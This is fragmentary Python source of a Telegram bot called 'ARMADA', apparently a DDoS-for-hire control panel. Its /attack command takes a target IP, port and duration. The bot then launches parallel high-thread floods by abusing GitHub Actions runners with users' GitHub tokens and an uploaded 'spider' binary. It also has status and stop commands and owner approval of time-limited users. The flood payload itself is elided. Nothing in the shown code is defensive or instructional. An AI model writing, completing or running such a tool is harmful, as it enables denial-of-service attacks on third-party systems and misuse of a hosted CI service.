...
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>\nYou don't have permission to launch attacks.", parse_mode='HTML')
            return
        ...
        if not github_tokens:
            await update.message.reply_text(
                "❌ <b>No GitHub Tokens</b>\nPlease add a token using:\n<code>/addtoken &lt;github_token&gt;</code>",
                parse_mode='HTML'
            )
            return
        ...
        try:
            ...
            await update.message.reply_text(
                "❌ <b>Binary Missing</b>\n'<code>spider</code>' not found in repository.\nUse <code>/binary_upload</code> to deploy.",
                parse_mode='HTML'
            )
            return

        # 🛠️ POWER CONFIG: 5 RUNNERS × 100 THREADS
...
"""
        ...
        message = (
            f"<b>⚡ ATTACK DEPLOYMENT – SUCCESS</b>\n\n"
            f"<pre>\n"
            f"┌─────────────────────────────────────────────┐\n"
            f"│  🎯 TARGET          │  {ip}:{port}              │\n"
            f"│  ⏱️ DURATION        │  {time_val} seconds          │\n"
            f"│  ⚙️ ARCHITECTURE    │  5 Parallel Runners     │\n"
            f"│  🧵 CONCURRENCY     │  100 Threads / Runner   │\n"
            f"│  🔥 TOTAL LOAD      │  500 Concurrent Threads │\n"
            f"│  📁 REPOSITORY      │  {repo_name}  │\n"
            f"│  👤 TOKEN HOLDER    │  @{valid_token['username']}                 │\n"
            f"│  🆔 DEPLOYMENT ID   │  {attack_id} │\n"
            f"│  🕒 INITIATED AT    │  {start_time} │\n"
            f"│  ⏳ ESTIMATED ETA   │  {finish_time} │\n"
            f"│  ⚡ THREAT LEVEL    │  {threat}              │\n"
            f"└─────────────────────────────────────────────┘\n"
            f"</pre>\n"
            f"📊 <b>Monitor Live:</b> <a href='{actions_url}'>GitHub Actions Dashboard</a>\n"
            f"🛑 <b>Control:</b> Use <code>/stop</code> to terminate this attack immediately.\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>System Online • Attack ID: {attack_id}</i>"
        )
    ...
    try:
        ...
        if not active_attacks:
            await update.message.reply_text(
                ...
                f"└─────────────────────────────────────┘\n"
                f"</pre>\n"
                f"<i>No active attacks. Deploy using /attack</i>",
                parse_mode='HTML'
            )
            return

        msg = "<b>📡 SYSTEM STATUS – ACTIVE DEPLOYMENTS</b>\n\n"
        msg += "<pre>\n"
        msg += "┌─────────────────────────────────────────────┐\n"
        msg += f"│  TOTAL ACTIVE :  {len(active_attacks)}                     │\n"
        msg += "├─────────────────────────────────────────────┤\n"
        ...
        msg += "└─────────────────────────────────────────────┘\n"
        msg += "</pre>\n"
        msg += f"<i>🛑 Use /stop to terminate all attacks.</i>"
...
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Deploy Attack", callback_data="attack_help")],
            ...
            await update.message.reply_text(
                f"<b>🔥 ARMADA – ATTACK SYSTEM</b>\n\n"
                f"<pre>\n"
                f"┌─────────────────────────────────────┐\n"
                f"│  👤 OPERATOR    :  @{username:<12} │\n"
                f"│  🎯 ROLE        :  {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED':<12} │\n"
                f"│  ⚙️ WORKERS     :  5 Parallel       │\n"
                f"│  🧵 THREADS     :  100 / Worker     │\n"
                f"│  🔥 TOTAL LOAD  :  500 Threads     │\n"
                f"│  📡 STATUS      :  🟢 ONLINE       │\n"
                f"└─────────────────────────────────────┘\n"
                f"</pre>\n"
...
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if not active_attacks:
            await update.message.reply_text("✅ No attack running.", parse_mode='HTML')
            return
        ...
        await update.message.reply_text(
            ...
            f"✅ Terminated <b>{count}</b> attack(s) successfully.\n"
            f"<i>System is now idle.</i>",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error</b>\n<code>{str(e)[:100]}</code>", parse_mode='HTML')
...
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ...
        "<b>⚔️ Attack Commands:</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
        "<code>/status</code> – View active deployments\n"
        "<code>/stop</code> – Emergency halt\n\n"
        "<b>🔧 Admin Commands:</b>\n"
        "<code>/addtoken &lt;token&gt;</code>\n"
        "<code>/removetoken &lt;token&gt;</code>\n"
        "<code>/checktokens</code>\n"
        "<code>/cleartokens confirm</code>\n"
        "<code>/tokens</code>\n"
        "<code>/binary_upload</code>\n"
        "<code>/approve &lt;id&gt; &lt;days&gt;</code>\n"
        "<code>/remove &lt;id&gt;</code>\n"
        "<code>/users</code>\n"
        "<code>/pending</code>\n"
        ...
        "<code>/myid</code> – Your user ID\n"
        "<code>/help</code> – This menu",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"<b>🆔 Your ID:</b> <code>{update.effective_user.id}</code>", parse_mode='HTML')
...
def main():
    try:
        ...
        logger.info("🚀 ARMADA is ONLINE – Professional Attack System Loaded!")
